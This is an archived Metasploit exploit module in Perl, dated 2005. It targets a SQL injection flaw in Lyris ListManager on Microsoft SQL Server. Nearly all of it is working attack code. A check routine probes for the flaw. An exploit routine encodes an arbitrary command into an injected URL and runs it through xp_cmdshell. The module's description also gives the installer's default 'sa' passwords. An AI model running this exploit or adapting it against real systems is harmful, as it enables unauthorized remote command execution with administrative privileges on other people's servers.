<html>
<head>
<title>Lyris ListManager Read Message Attachment SQL Injection Exploit</title>
<pre>

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::lyris_attachment_mssql;
use base &quot;Msf::Exploit&quot;;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  =&gt; 'Lyris ListManager Attachment SQL Injection (MSSQL)',
	'Version'  =&gt; '$Revision: 1.2 $',
	'Authors' =&gt; [ 'H D Moore &lt;hdm [at] metasploit.com&gt;', ],
	'Arch'  =&gt; [ ],
	'OS'    =&gt; [ 'win32' ],
	'Priv'  =&gt; 1,
	'UserOpts'  =&gt;
	  {
		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
		'RPORT' =&gt; [1, 'PORT', 'The target port', 80],
		'SSL'   =&gt; [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =&gt;
	  {
	  	'Space' =&gt; 1000,
		'Keys'  =&gt; ['cmd'],
	  },

	'Description'  =&gt; Pex::Text::Freeform(qq{
		This module exploits a SQL injection flaw in the Lyris ListManager
	software for Microsoft SQL Server. This flaw allows for arbitrary commands
	to be executed with administrative privileges by calling the xp_cmdshell
	stored procedure. Additionally, a window of opportunity is opened during the
	ListManager for MSDE install process; the 'sa' account is set to the password 'lminstall'
	for a 5-10 minute period. After the installer finishes, the password is
	permanently set to 'lyris' followed by the process ID of the installer (a 1-5 digit number).
}),

	'Refs'  =&gt;
	  [
		['URL',   'http://metasploit.com/research/vulns/lyris_listmanager/'],
		['OSVDB', '21548'],
	  ],
	  
	'DefaultTarget' =&gt; 0,
	'Targets' =&gt;
	  [
		['No target needed.'],
	  ],

	'Keys' =&gt; ['lyris'],
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self-&gt;GetVar('RHOST');
	my $target_port = $self-&gt;GetVar('RPORT');

	my $s = Msf::Socket::Tcp-&gt;new
	  (
		'PeerAddr'  =&gt; $target_host,
		'PeerPort'  =&gt; $target_port,
		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
		'SSL'       =&gt; $self-&gt;GetVar('SSL'),
	  );
	if ($s-&gt;IsError) {
		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
		return $self-&gt;CheckCode('Connect');
	}

	$s-&gt;Send(&quot;GET /read/attachment/' HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n&quot;);

	my $r = $s-&gt;Recv(-1, 5);

	if ($r =~ /Unclosed quotation mark before/) {
		$self-&gt;PrintLine(&quot;[*] Vulnerable installation detected ;)&quot;);
		return $self-&gt;CheckCode('Detected');
	}
	
	if ($r =~ /SQL error reported from Lyris/) {
		$self-&gt;PrintLine(&quot;[*] Vulnerable installation, but not running MSSQL.&quot;);
		return $self-&gt;CheckCode('Safe');
	}
	
	if ($r =~ /ListManagerWeb.*Content-Length: 0/sm) {
		$self-&gt;PrintLine(&quot;[*] This system appears to be patched&quot;);
		return $self-&gt;CheckCode('Safe');	
	}
	
	$self-&gt;PrintLine(&quot;[*] Unknown response, patched or invalid target.&quot;);
	return $self-&gt;CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self-&gt;GetVar('RHOST');
	my $target_port = $self-&gt;GetVar('RPORT');
	my $target_idx  = $self-&gt;GetVar('TARGET');

	my $cmd = $self-&gt;GetVar('EncodedPayload')-&gt;RawPayload;

	my $sql = 
		'DECLARE @X NVARCHAR(4000);'.
		'SET @X= ';

	foreach my $c (unpack('C*', $cmd)) {
		$sql .= &quot;CHAR($c) + &quot;;
	}
	$sql .= &quot;'\x20';&quot;;
	$sql .= 'EXEC MASTER..XP_CMDSHELL @X';

	my $url = &quot;/read/attachment/1;&quot;.$self-&gt;URLEncode($sql).&quot;;--&quot;;


	my $request =
	  &quot;GET $url HTTP/1.1\r\n&quot;.
	  &quot;Host: $target_host:$target_port\r\n\r\n&quot;;

	my $s = Msf::Socket::Tcp-&gt;new
	  (
		'PeerAddr'  =&gt; $target_host,
		'PeerPort'  =&gt; $target_port,
		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
		'SSL'       =&gt; $self-&gt;GetVar('SSL'),
	  );
	if ($s-&gt;IsError) {
		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
		return;
	}

	$self-&gt;PrintLine(&quot;[*] Sending &quot; .length($request) . &quot; bytes to remote host.&quot;);
	$s-&gt;Send($request);

	$self-&gt;PrintLine(&quot;[*] Waiting for a response...&quot;);
	$s-&gt;Recv(-1, 10);
	$self-&gt;Handler($s);
	$s-&gt;Close();
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack('C*', $data)) {
		if (
			($c &gt;= 0x30 &amp;&amp; $c &lt;= 0x39) ||
			($c &gt;= 0x41 &amp;&amp; $c &lt;= 0x5A) ||
			($c &gt;= 0x61 &amp;&amp; $c &lt;= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf(&quot;%%%.2x&quot;, $c);
		}
	}
	return $res;
}

1;


# milw0rm.com [2005-12-09]
</pre>
</html>

